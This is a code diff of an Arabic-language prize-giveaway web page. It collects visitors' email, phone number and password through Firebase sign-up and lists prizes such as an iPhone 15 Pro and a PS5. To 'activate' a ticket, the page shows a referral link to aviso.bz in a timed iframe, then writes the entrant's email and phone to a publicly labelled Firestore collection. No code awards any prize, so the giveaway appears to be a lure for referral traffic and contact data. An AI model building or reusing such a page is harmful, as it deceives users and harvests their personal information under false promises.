@@ -3,236 +3,391 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التذاكر الذكي - Aviso</title>
+    <title>طومبولا الحظ | Pro</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Cairo', sans-serif;
-            background: linear-gradient(135deg, #e0e7ff 0%, #f1f5f9 100%);
-            min-height: 100vh;
-            margin: 0;
+        :root {
+            --primary: #6366f1;
+            --secondary: #a855f7;
+            --accent: #10b981;
+        }
+        body { 
+            font-family: 'Cairo', sans-serif; 
+            background: #0f172a; 
+            color: white; 
             overflow-x: hidden;
+            margin: 0;
         }
-        .glass-card {
-            background: rgba(255, 255, 255, 0.98);
-            backdrop-filter: blur(15px);
-            border-radius: 32px;
-            box-shadow: 0 10px 40px -10px rgba(0, 0, 0, 0.1);
+        .bg-animate {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 20% 30%, #1e1b4b 0%, #0f172a 100%);
+            z-index: -1;
         }
-        .ticket-card {
-            min-height: 400px;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            border: 3px dashed #cbd5e1;
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+        }
+        .page { display: none; min-height: 100vh; opacity: 0; transition: opacity 0.4s ease; }
+        .page.active { display: flex; flex-direction: column; opacity: 1; }
+
+        .prize-card {
+            border-radius: 24px;
+            overflow: hidden;
             background: white;
+            width: 100%;
+            height: 100%;
+            animation: fadeIn 0.5s ease-out;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
             position: relative;
         }
-        .ticket-card:not(.activated):hover {
-            transform: translateY(-15px);
-            border-color: #2563eb;
-            box-shadow: 0 30px 50px -15px rgba(37, 99, 235, 0.2);
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        .ticket-card.activated {
-            border: 3px solid #10b981;
-            background: #f0fdf4;
-            cursor: default;
-        }
-        .hidden-page {
-            display: none;
-        }
-        .ticket-cutout::before, .ticket-cutout::after {
-            content: '';
-            position: absolute;
-            left: -20px;
-            width: 40px;
-            height: 40px;
-            background: #e0e7ff;
-            border-radius: 50%;
-            top: 70%;
-            transform: translateY(-50%);
-        }
-        .ticket-cutout::after {
-            left: auto;
-            right: -20px;
-        }
-        #site-viewer-container {
-            position: fixed;
-            top: 0;
-            left: 0;
+
+        .prize-img {
+            height: 140px;
             width: 100%;
-            height: 100%;
+            object-fit: contain;
+            padding: 15px;
             background: white;
-            z-index: 100;
         }
-        .floating-countdown {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 200;
-            background: rgba(255, 255, 255, 0.95);
-            padding: 15px 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            border: 3px solid #2563eb;
+
+        .prize-info {
+            background: #059669;
+            color: white;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .prize-info.pending {
+            background: #1e293b;
+            color: #94a3b8;
+        }
+
+        .activation-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(15, 23, 42, 0.7);
+            backdrop-filter: blur(2px);
             display: flex;
             align-items: center;
-            gap: 15px;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: 10;
         }
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
+
+        .prize-card:hover .activation-overlay {
+            opacity: 1;
+        }
+
+        #adFrameContainer {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 9999;
+            background: #000;
+        }
+        #adFrame { width: 100%; height: calc(100% - 60px); border: none; margin-top: 60px; }
+        .ad-header {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 60px;
+            background: rgba(15, 23, 42, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 2px solid var(--primary);
+            z-index: 10000;
+        }
+        
+        #toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 12px 24px;
+            border-radius: 12px;
+            background: #1e293b;
+            border: 1px solid rgba(255,255,255,0.1);
+            color: white;
+            font-size: 14px;
+            z-index: 200;
+            display: none;
+        }
+
+        .prize-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 1.5rem;
+            padding-bottom: 40px;
         }
     </style>
 </head>
-<body class="flex items-center justify-center p-4 md:p-10">
+<body>
+    <div class="bg-animate"></div>
+    <div id="toast"></div>
 
-    <!-- واجهة تسجيل الدخول -->
-    <div id="auth-container" class="w-full max-w-lg p-12 glass-card">
-        <div class="text-center mb-10">
-            <h1 class="text-4xl font-black text-gray-900">تسجيل الدخول</h1>
-            <p class="text-gray-500 mt-3 text-xl">منصة ربح المال والتذاكر</p>
-        </div>
-        <form onsubmit="event.preventDefault(); showTicketsPage();" class="space-y-6">
-            <!-- حقل البريد الإلكتروني -->
-            <div>
-                <label class="block text-sm font-bold text-gray-700 mb-2 mr-2">البريد الإلكتروني</label>
-                <input type="email" required placeholder="example@mail.com" class="w-full px-6 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-4 focus:ring-blue-100 focus:border-blue-500 focus:outline-none text-lg text-right transition-all">
+    <div id="adFrameContainer">
+        <div class="ad-header">
+            <div class="flex items-center gap-4">
+                <span class="text-sm font-bold text-slate-300">جاري التفعيل... لا تغلق الصفحة</span>
+                <div class="bg-indigo-600 px-4 py-1 rounded-full font-black text-xl" id="frameTimer">10</div>
             </div>
+        </div>
+        <iframe id="adFrame" src=""></iframe>
+    </div>
 
-            <!-- حقل رقم الهاتف المضاف -->
-            <div>
-                <label class="block text-sm font-bold text-gray-700 mb-2 mr-2">رقم الهاتف</label>
-                <div class="relative">
-                    <input type="tel" required placeholder="05XXXXXXXX" class="w-full px-6 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-4 focus:ring-blue-100 focus:border-blue-500 focus:outline-none text-lg text-right transition-all">
-                    <div class="absolute inset-y-0 left-4 flex items-center pointer-events-none text-gray-400">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
-                        </svg>
-                    </div>
+    <!-- صفحة تسجيل الدخول -->
+    <div id="loginPage" class="page active items-center justify-center p-4">
+        <div class="max-w-md w-full glass p-8 shadow-2xl">
+            <h1 class="text-4xl font-black mb-2 text-center text-indigo-400">طومبولا الحظ</h1>
+            <p class="text-slate-400 text-center mb-8 text-sm">أدخل بياناتك للمشاركة في السحب</p>
+            <div class="space-y-4">
+                <input type="email" id="emailInput" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-2xl outline-none text-left bg-white/5 border border-white/10 focus:border-indigo-500 transition" dir="ltr">
+                <input type="tel" id="phoneInput" placeholder="رقم الهاتف" class="w-full p-4 rounded-2xl outline-none text-left bg-white/5 border border-white/10 focus:border-indigo-500 transition" dir="ltr">
+                <input type="password" id="passwordInput" placeholder="كلمة المرور" class="w-full p-4 rounded-2xl outline-none text-left bg-white/5 border border-white/10 focus:border-indigo-500 transition" dir="ltr">
+                <button id="authBtn" class="w-full bg-indigo-600 text-white font-black py-4 rounded-2xl mt-4 shadow-lg active:scale-95 transition-transform">دخول / تسجيل</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- لوحة التحكم -->
+    <div id="dashboardPage" class="page p-6">
+        <div class="max-w-5xl mx-auto w-full">
+            <header class="flex justify-between items-center mb-10 mt-4">
+                <div>
+                    <h2 class="text-2xl font-black">قائمة الجوائز المتاحة</h2>
+                    <p id="userPhoneDisplay" class="text-indigo-400 font-bold text-sm mt-1">--</p>
                 </div>
+                <button id="logoutBtn" class="bg-white/5 text-slate-300 px-4 py-2 rounded-xl text-xs font-bold hover:bg-white/10 transition">خروج</button>
+            </header>
+            
+            <div class="prize-grid" id="prizeGrid"></div>
+
+            <div class="text-center mt-6 text-slate-500 text-xs">
+                 اختر جائزة وقم بتفعيلها للدخول في السحب 🏆
             </div>
-
-            <!-- حقل كلمة السر -->
-            <div>
-                <label class="block text-sm font-bold text-gray-700 mb-2 mr-2">كلمة السر</label>
-                <input type="password" required placeholder="••••••••" class="w-full px-6 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-4 focus:ring-blue-100 focus:border-blue-500 focus:outline-none text-lg text-right transition-all">
-            </div>
-
-            <button type="submit" class="w-full bg-blue-600 text-white py-5 rounded-2xl font-black text-xl hover:bg-blue-700 transition-all shadow-xl shadow-blue-200 active:scale-95 transform">
-                دخول للنظام
-            </button>
-        </form>
-        <p class="text-center mt-6 text-gray-500 text-sm">بمتابعتك، أنت توافق على شروط الخدمة</p>
-    </div>
-
-    <!-- واجهة التذاكر -->
-    <div id="tickets-container" class="hidden-page w-full max-w-[1600px]">
-        <div class="flex justify-between items-center mb-16 bg-white p-10 rounded-[40px] shadow-xl border border-white">
-            <h2 class="text-5xl font-black text-gray-900">تذاكر Aviso</h2>
-            <button onclick="location.reload()" class="bg-gray-100 px-10 py-4 rounded-2xl font-black text-xl hover:bg-red-500 hover:text-white transition-all">خروج</button>
-        </div>
-        <div id="tickets-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-10">
-            <!-- التذاكر تولد عبر JS -->
         </div>
     </div>
 
-    <!-- واجهة عرض الموقع مع العداد المدمج -->
-    <div id="site-viewer-container" class="hidden-page">
-        <div class="floating-countdown">
-            <div class="text-blue-600 font-black text-5xl" id="timer-display">5</div>
-            <div class="text-right">
-                <div class="font-bold text-gray-800 text-lg">سيتم التفعيل خلال</div>
-                <div class="text-sm text-blue-500 font-bold">جاري عرض منصة Aviso...</div>
-            </div>
-        </div>
-        <iframe id="target-frame" src="about:blank"></iframe>
-    </div>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+        import { getFirestore, doc, onSnapshot, setDoc, getDoc, serverTimestamp, addDoc, collection, enableIndexedDbPersistence } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
+        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
 
-    <script>
-        let currentTicketId = null;
+        const firebaseConfig = {
+            apiKey: "AIzaSyCYipCdnHZXCkO3qKN9AqaWM9IDf9rOv04",
+            authDomain: "soug-62f2f.firebaseapp.com",
+            projectId: "soug-62f2f",
+            storageBucket: "soug-62f2f.firebasestorage.app",
+            messagingSenderId: "672944475308",
+            appId: "1:672944475308:web:c8158bdf2c5613f51c2309"
+        };
 
-        function showTicketsPage() {
-            document.getElementById('auth-container').style.display = 'none';
-            document.getElementById('tickets-container').style.display = 'block';
-            renderTickets();
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = "tombola-luck-v1";
+        const AVISO_URL = "https://aviso.bz/?r=id_2812";
+
+        // تفعيل وضع العمل دون اتصال لضمان استقرار التطبيق
+        try {
+            enableIndexedDbPersistence(db).catch((err) => {
+                if (err.code == 'failed-precondition') {
+                    console.warn("Persistence failed: Multiple tabs open.");
+                } else if (err.code == 'unimplemented') {
+                    console.warn("Persistence not supported by browser.");
+                }
+            });
+        } catch(e) {}
+
+        const prizeData = {
+            1: { name: "Samsung Galaxy A24", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/%D9%87%D8%A7%D8%AA%D9%81-Samsung-Galaxy-A24.jpg?raw=true" },
+            2: { name: "Smart Watch Pro", img: "https://m.media-amazon.com/images/I/41pzRGn1OnL._SS400_.jpg" },
+            3: { name: "Airpods Pro 2", img: "https://m.media-amazon.com/images/I/61SUj2W5ySL._AC_SL1500_.jpg" },
+            4: { name: "PlayStation 5 Slim", img: "https://m.media-amazon.com/images/I/51051HiS9OL._SL1500_.jpg" },
+            5: { name: "Gaming Mouse RGB", img: "https://m.media-amazon.com/images/I/61UxfXTCCvL._AC_SL1500_.jpg" },
+            6: { name: "Condor Refrigerator", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/aac8ea81-cdea-499f-8668-21507e131368.jpg?raw=true" },
+            7: { name: "Iphone 15 Pro", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/0a334a0a-c014-4440-921a-ef2a30c23940.jpg?raw=true" },
+            8: { name: "Amazon Gift Card $50", img: "https://m.media-amazon.com/images/I/61Y-T3yC04L._AC_SL1500_.jpg" }
+        };
+
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => {
+                p.classList.remove('active');
+                p.style.display = 'none';
+            });
+            const target = document.getElementById(id);
+            if(target) {
+                target.style.display = (id === 'loginPage') ? 'flex' : 'block';
+                setTimeout(() => target.classList.add('active'), 10);
+            }
         }
 
-        function openAvisoWithTimer(ticketId) {
-            const ticketElement = document.getElementById(`ticket-${ticketId}`);
-            if (ticketElement.classList.contains('activated')) return;
+        function showMessage(msg) {
+            const t = document.getElementById('toast');
+            if(!t) return;
+            t.innerText = msg;
+            t.style.display = 'block';
+            setTimeout(() => { if(t) t.style.display = 'none'; }, 3000);
+        }
 
-            currentTicketId = ticketId;
-            const container = document.getElementById('site-viewer-container');
-            const frame = document.getElementById('target-frame');
-            const timerText = document.getElementById('timer-display');
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                let phone = localStorage.getItem('user_phone') || "غير معروف";
+                try {
+                    const snap = await getDoc(doc(db, 'artifacts', appId, 'users', user.uid, 'profile', 'info'));
+                    if (snap.exists()) phone = snap.data().phone;
+                } catch (err) {
+                    console.log("Using cached phone number.");
+                }
+                
+                const display = document.getElementById('userPhoneDisplay');
+                if(display) display.innerText = "المشارك: " + phone;
+                
+                showPage('dashboardPage');
+                renderGrid(user.uid);
+            } else {
+                showPage('loginPage');
+            }
+        });
+
+        document.getElementById('authBtn').onclick = async () => {
+            const email = document.getElementById('emailInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
+            const phone = document.getElementById('phoneInput').value.trim();
             
-            container.classList.remove('hidden-page');
-            frame.src = "https://aviso.bz/"; 
+            if(!email || !password || !phone) {
+                showMessage("يرجى ملء جميع الخانات");
+                return;
+            }
 
-            let timeLeft = 5;
-            timerText.innerText = timeLeft;
+            try { 
+                await signInWithEmailAndPassword(auth, email, password);
+                localStorage.setItem('user_phone', phone);
+            } catch (err) { 
+                if (err.code === 'auth/user-not-found' || err.code === 'auth/invalid-credential' || err.code === 'auth/invalid-email') {
+                    try {
+                        const res = await createUserWithEmailAndPassword(auth, email, password);
+                        await setDoc(doc(db, 'artifacts', appId, 'users', res.user.uid, 'profile', 'info'), {
+                            phone: phone, email: email, createdAt: serverTimestamp()
+                        });
+                        localStorage.setItem('user_phone', phone);
+                    } catch (createErr) {
+                        showMessage("خطأ: " + createErr.message);
+                    }
+                } else {
+                    showMessage("خطأ في تسجيل الدخول");
+                }
+            }
+        };
 
-            const countdown = setInterval(() => {
-                timeLeft--;
-                timerText.innerText = timeLeft;
+        document.getElementById('logoutBtn').onclick = () => signOut(auth);
 
-                if (timeLeft <= 0) {
-                    clearInterval(countdown);
-                    container.classList.add('hidden-page');
-                    frame.src = "about:blank";
-                    activateTicket(currentTicketId);
+        function renderGrid(uid) {
+            const grid = document.getElementById('prizeGrid');
+            if(!grid) return;
+            grid.innerHTML = '';
+            
+            for(let i=1; i<=8; i++) {
+                const container = document.createElement('div');
+                container.id = `card-container-${i}`;
+                grid.appendChild(container);
+
+                onSnapshot(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${i}`), (snap) => {
+                    const active = snap.exists() && snap.data().active;
+                    const prize = prizeData[i];
+                    const cardBox = document.getElementById(`card-container-${i}`);
+                    if(!cardBox) return;
+                    
+                    if(active) {
+                        cardBox.innerHTML = `
+                            <div class="prize-card">
+                                <img src="${prize.img}" class="prize-img" alt="${prize.name}">
+                                <div class="prize-info">
+                                    <h4 class="font-bold text-[10px] mb-1 truncate px-2">${prize.name}</h4>
+                                    <p class="text-[9px] font-mono bg-black/20 py-1 rounded mx-1">رقم: ${snap.data().ticketNumber}</p>
+                                    <p class="text-[8px] mt-1 opacity-90 font-bold">مفعلة ✅</p>
+                                </div>
+                            </div>
+                        `;
+                    } else {
+                        cardBox.innerHTML = `
+                            <div class="prize-card group">
+                                <div class="activation-overlay">
+                                    <button onclick="window.startActivation('${uid}', ${i})" class="bg-indigo-600 hover:bg-indigo-500 text-white text-[10px] font-bold py-2 px-4 rounded-full shadow-lg transform transition active:scale-90">
+                                        اضغط للتفعيل
+                                    </button>
+                                </div>
+                                <img src="${prize.img}" class="prize-img grayscale-[0.5] group-hover:grayscale-0 transition-all" alt="${prize.name}">
+                                <div class="prize-info pending">
+                                    <h4 class="font-bold text-[10px] mb-1 truncate px-2">${prize.name}</h4>
+                                    <p class="text-[8px] font-bold">بانتظار التفعيل 🔒</p>
+                                </div>
+                            </div>
+                        `;
+                    }
+                }, (err) => {
+                    console.error("Listener Error:", err);
+                });
+            }
+        }
+
+        window.startActivation = async function(uid, index) {
+            const container = document.getElementById('adFrameContainer');
+            const frame = document.getElementById('adFrame');
+            const timerEl = document.getElementById('frameTimer');
+            
+            container.style.display = 'block';
+            frame.src = AVISO_URL;
+
+            let time = 10;
+            timerEl.innerText = time;
+
+            const interval = setInterval(async () => {
+                time--;
+                timerEl.innerText = time;
+
+                if(time <= 0) {
+                    clearInterval(interval);
+                    const phone = localStorage.getItem('user_phone') || "Unknown";
+                    const ticketNum = `LUCK-${index}${Math.floor(1000 + Math.random() * 9000)}`;
+                    const prize = prizeData[index];
+
+                    try {
+                        await setDoc(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${index}`), {
+                            active: true, 
+                            phone: phone, 
+                            ticketNumber: ticketNum, 
+                            timestamp: serverTimestamp()
+                        });
+                        
+                        await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'all_activations'), {
+                            userId: uid, 
+                            email: auth.currentUser?.email || "Anonymous", 
+                            phone: phone, 
+                            prizeName: prize.name, 
+                            ticketNumber: ticketNum, 
+                            activatedAt: serverTimestamp()
+                        });
+
+                        container.style.display = 'none';
+                        frame.src = "";
+                        showMessage("تم تفعيل الجائزة بنجاح!");
+                    } catch (e) {
+                        container.style.display = 'none';
+                        showMessage("خطأ في التفعيل. يرجى المحاولة لاحقاً.");
+                    }
                 }
             }, 1000);
-        }
-
-        function activateTicket(id) {
-            const ticket = document.getElementById(`ticket-${id}`);
-            ticket.classList.add('activated');
-            
-            const iconContainer = ticket.querySelector('.icon-container');
-            iconContainer.className = "icon-container inline-flex p-6 bg-green-100 rounded-3xl text-green-700 mb-8";
-            iconContainer.innerHTML = `
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
-                </svg>
-            `;
-
-            const statusText = ticket.querySelector('.status-text');
-            statusText.innerText = "تم التفعيل بنجاح";
-            statusText.className = "status-text text-xl font-bold text-green-600 text-right";
-
-            const btnText = ticket.querySelector('.btn-text');
-            btnText.innerText = "تذكرة مفعلة ✅";
-            btnText.parentElement.className = "bg-green-600 text-white py-4 px-6 rounded-2xl font-black text-xl shadow-lg";
-        }
-
-        function renderTickets() {
-            const grid = document.getElementById('tickets-grid');
-            grid.innerHTML = '';
-            for (let i = 1; i <= 8; i++) {
-                const ticket = document.createElement('div');
-                ticket.id = `ticket-${i}`;
-                ticket.className = 'ticket-card p-10 flex flex-col items-center ticket-cutout cursor-pointer rounded-[32px]';
-                ticket.onclick = () => openAvisoWithTimer(i);
-                ticket.innerHTML = `
-                    <div class="text-center w-full flex-grow">
-                        <div class="icon-container inline-flex p-6 bg-yellow-100 rounded-3xl text-yellow-700 mb-8">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-                            </svg>
-                        </div>
-                        <h3 class="text-3xl font-black text-gray-800 mb-3 text-right">تذكرة ربح Aviso</h3>
-                        <p class="status-text text-xl font-bold text-blue-500 text-right">اضغط لبدء المهمة</p>
-                    </div>
-                    <div class="ticket-divider text-center">
-                        <div class="bg-blue-600 text-white py-4 px-6 rounded-2xl font-black text-xl shadow-lg transition-colors">
-                            <span class="btn-text">تفعيل التذكرة</span>
-                        </div>
-                    </div>
-                `;
-                grid.appendChild(ticket);
-            }
         }
     </script>
 </body>
